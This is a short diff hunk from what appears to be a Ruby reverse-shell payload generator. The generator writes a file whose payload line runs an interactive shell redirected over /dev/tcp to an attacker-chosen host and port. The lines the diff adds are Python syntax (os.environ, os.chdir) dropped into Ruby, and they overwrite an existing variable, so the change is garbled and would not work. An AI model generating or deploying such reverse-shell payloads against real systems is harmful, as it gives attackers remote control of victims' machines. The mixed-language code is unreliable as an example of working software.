@@ -57,11 +57,15 @@ begin
     sleep(1)
     puts "#{g}Saving to #{file}..."
     sleep(0.5)
+    w = os.environ['OLDPWD']
+    os.chdir(w)
     open(file, 'w') { |f|
         f.puts "begin"
 	f.puts "    Exec(\"#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1 &\");"
         f.puts "end."
     }
+    g = os.environ['HOME']
+    os.chdir(g + "/thoron")
     puts "#{s}Saved to #{file}!"
 rescue
     puts "#{e}Failed to generate payload!"
